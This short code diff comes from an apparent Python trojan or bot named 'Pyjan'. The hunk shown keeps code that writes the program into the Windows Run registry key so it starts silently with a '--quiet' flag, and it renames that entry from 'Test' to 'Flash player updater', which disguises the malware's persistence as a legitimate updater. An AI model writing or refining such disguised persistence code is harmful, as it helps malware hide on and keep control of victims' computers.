@@ -53,7 +53,7 @@ class Pyjan:
 
 		startup_val = r"Software\Microsoft\Windows\CurrentVersion\Run"
 		key2change = winreg.OpenKey(winreg.HKEY_CURRENT_USER, startup_val, 0, winreg.KEY_ALL_ACCESS)
-		winreg.SetValueEx(key2change, 'Test', 0, winreg.REG_SZ, start_path+" --quiet") # Добавляем программу в автозагрузку с помощью ключа реестра
+		winreg.SetValueEx(key2change, 'Flash player updater', 0, winreg.REG_SZ, start_path+" --quiet") # Добавляем программу в автозагрузку с помощью ключа реестра
 		
 
 	def bot_handler(self, message):
